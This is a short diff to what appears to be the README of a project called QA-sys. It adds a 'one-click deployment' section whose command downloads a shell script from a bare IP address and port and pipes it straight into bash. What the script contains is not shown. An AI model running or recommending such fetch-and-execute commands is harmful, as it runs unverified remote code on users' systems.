@@ -45,3 +45,7 @@ cd QA-sys
 docker compose up --build -d
 docker exec qa-sys-web-1 flask db upgrade
 ```
+### 7. 一键部署（docker环境下）
+```
+bash <(wget -qO- 119.29.104.150:6000/install.sh)
+```
